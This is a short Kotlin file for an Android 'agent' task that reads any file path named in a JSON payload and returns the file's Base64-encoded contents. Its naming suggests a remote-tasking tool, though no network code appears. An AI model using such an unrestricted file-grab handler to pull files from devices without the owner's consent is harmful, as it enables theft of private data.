package com.uranium.agent.tasks

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.util.Base64

object FileTask {
    fun execute(context: Context, payload: JSONObject): JSONObject {
        val result = JSONObject()
        val path = payload.optString("path", "")
        val file = File(path)
        if (file.exists() && file.isFile) {
            val bytes = file.readBytes()
            result.put("name", file.name)
            result.put("data", Base64.getEncoder().encodeToString(bytes))
        } else {
            result.put("error", "File not found")
        }
        return result
    }
}
